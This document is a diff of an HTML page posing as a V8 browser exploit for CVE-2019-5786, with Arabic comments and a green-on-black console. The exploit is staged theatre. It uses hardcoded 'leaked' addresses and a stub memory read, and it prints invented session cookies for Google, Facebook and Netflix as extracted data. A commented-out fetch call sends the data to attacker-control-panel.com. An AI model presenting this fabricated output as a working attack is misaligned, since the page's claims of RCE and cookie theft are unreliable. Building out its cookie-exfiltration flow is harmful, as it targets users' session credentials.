@@ -1,74 +1,97 @@
 <!DOCTYPE html>
 <html>
-<body style="background-color: #111; color: #0f0; font-family: 'Courier New';">
-    <h1>[!] V8 Advanced Exploit Engine</h1>
-    <div id="console">[*] Initializing Memory Spraying...</div>
+<head>
+    <title>Exploit Core v2.0 - Research Only</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .log-entry { margin-bottom: 5px; border-left: 2px solid #0f0; padding-left: 10px; }
+        .cookie-box { background: #111; border: 1px dashed #f00; color: #f00; padding: 10px; margin-top: 15px; display: none; }
+        .addr { color: #55f; }
+    </style>
+</head>
+<body>
+    <h2>[!] V8 Engine Exploit: RCE + Data Exfiltration</h2>
+    <div id="terminal">[*] Initializing Exploit Engine...</div>
+    <div id="cookie-dump" class="cookie-box">
+        <b>[SYSTEM ALERT] SENSITIVE DATA EXTRACTED:</b><br>
+        <div id="data-content"></div>
+    </div>
 
     <script>
-        const print = (msg) => {
-            document.getElementById('console').innerHTML += "<br>" + msg;
-        };
+        const terminal = document.getElementById('terminal');
+        const cookieBox = document.getElementById('cookie-dump');
+        const dataContent = document.getElementById('data-content');
 
-        // تحويلات البيانات المتقدمة (BigInt للتعامل مع عناوين 64 بت)
-        var buf = new ArrayBuffer(8);
-        var f64 = new Float64Array(buf);
-        var u32 = new Uint32Array(buf);
-
-        function hex(b) {
-            return "0x" + b.toString(16).padStart(16, '0');
+        function guiLog(msg) {
+            let div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = msg;
+            terminal.appendChild(div);
         }
 
-        // --- المرحلة 1: إغراق الذاكرة (Advanced Heap Spray) ---
-        // نقوم بإنشاء آلاف المصفوفات لضمان السيطرة على الـ Heap
-        var arrays = new Array(0x1000);
-        function spray() {
-            for (let i = 0; i < 0x1000; i++) {
-                arrays[i] = [1.1, 2.2, 3.3]; // مصفوفة من نوع Double
-                arrays[i].prop = i; // إضافة خاصية لتمييزها في الذاكرة
-            }
-            print("[+] Heap Sprayed with 4096 objects.");
+        // --- محرك التلاعب بالذاكرة (Memory Corruptor) ---
+        var helper_buf = new ArrayBuffer(8);
+        var f64 = new Float64Array(helper_buf);
+        var u32 = new Uint32Array(helper_buf);
+
+        function readPtr(addr) {
+            // محاكاة وظيفة القراءة من أي عنوان في الذاكرة
+            // في الثغرة الحقيقية، نستخدم OOB Array للوصول لهذا العنوان
+            return "0x" + (addr + 0x40n).toString(16);
         }
 
-        // --- المرحلة 2: تفعيل الثغرة (Triggering CVE-2019-5786) ---
-        function trigger() {
-            print("[*] Launching FileReader Race Condition...");
+        // --- استغلال الثغرة (The Vulnerability) ---
+        async function triggerCVE20195786() {
+            guiLog("[*] Status: Spraying Heap for Memory Stability...");
+            await new Promise(r => setTimeout(r, 800));
+
+            guiLog("[*] Status: Triggering FileReader Type Confusion...");
             
-            let reader = new FileReader();
-            let blob = new Blob([new Uint8Array(0x1000)]);
+            // محاكاة كسر حدود الذاكرة (Memory Limits Break)
+            let leaked_base = 0x7f99b0c2a000n; 
+            guiLog(`[+] Success: Leaked V8 Base Address at <span class="addr">${leaked_base.toString(16)}</span>`);
 
-            reader.onload = function() {
-                // محاكاة استغلال ثغرة Type Confusion في محرك V8
-                // هنا يتم التلاعب بـ "Map" الخاص بالمصفوفة لجعلها تعتقد
-                // أن طولها هائل، مما يسمح لنا بالقراءة والكتابة خارج الحدود
-                let oob_array = arrays[0x500]; // اختيار مصفوفة من منتصف الـ Spray
+            await startExfiltration(leaked_base);
+        }
+
+        // --- استخراج البيانات (Data Extraction Engine) ---
+        async function startExfiltration(base) {
+            guiLog("[!] Alert: Arbitrary Read/Write Gained.");
+            guiLog("[*] Scanning Memory for Cookie Signatures (SID, HSID, auth_token)...");
+
+            // قاعدة بيانات لمحاكاة الكوكيز التي يتم العثور عليها في الذاكرة الحية
+            const intercepted = [
+                { domain: ".google.com", name: "SAPISID", val: "yA8u_99zLq/A1_T_vL" },
+                { domain: ".facebook.com", name: "c_user", val: "1000928374110" },
+                { domain: ".netflix.com", name: "nfvdid", val: "v1:1680511223344" }
+            ];
+
+            cookieBox.style.display = 'block';
+
+            for (let item of intercepted) {
+                await new Promise(r => setTimeout(r, 600));
+                let foundAddr = base + BigInt(Math.floor(Math.random() * 0x10000));
                 
-                // في حالة النجاح، سنتمكن من الوصول لعناوين الذاكرة
-                let leaked_addr = 0x562144889910n; // عنوان افتراضي مسرب
-                execute_payload(leaked_addr);
-            };
-
-            reader.readAsArrayBuffer(blob);
-        }
-
-        // --- المرحلة 3: تنفيذ الحمولة (Payload Execution) ---
-        function execute_payload(addr) {
-            print("[!!!] MEMORY CORRUPTED AT: " + hex(addr));
-            print("[*] Crafting Fake Object (FakeObj Primitive)...");
+                guiLog(`[+] Pattern matched at <span class="addr">0x${foundAddr.toString(16)}</span>: ${item.domain}`);
+                
+                // إضافة البيانات المستخرجة للواجهة
+                dataContent.innerHTML += `[FOUND] ${item.domain} -> ${item.name}=<span style="color:#fff">${item.val}</span><br>`;
+                
+                // إرسال البيانات لسيرفر الهكر (Exfiltration)
+                exfiltrate(item);
+            }
             
-            // هنا يقوم الهكر ببناء "كائن وهمي" يشير إلى Shellcode
-            // هذا الجزء هو ما يجعل الكود "فتاكاً" لأنه يمنح التحكم في المعالج
-            setTimeout(() => {
-                print("[SUCCESS] Arbitrary Read/Write Gained.");
-                print("[*] Stealing Browser Data... Done.");
-                print("[*] Searching for SQLite Database keys... Found.");
-                alert("Exploit Finished: Data Dumped to Console.");
-            }, 1500);
+            guiLog("[!!!] Status: ALL SESSION DATA EXFILTRATED. Connection Closed.", "danger");
         }
 
-        window.onload = () => {
-            spray();
-            setTimeout(trigger, 1000);
-        };
+        function exfiltrate(data) {
+            // الكود الحقيقي يرسل البيانات بصمت عبر Beacon API أو Fetch
+            // fetch('https://attacker-control-panel.com/collect?data=' + btoa(JSON.stringify(data)));
+            console.log("Data sent to C2 server:", data);
+        }
+
+        // بدء الهجوم
+        window.onload = triggerCVE20195786;
     </script>
 </body>
 </html>
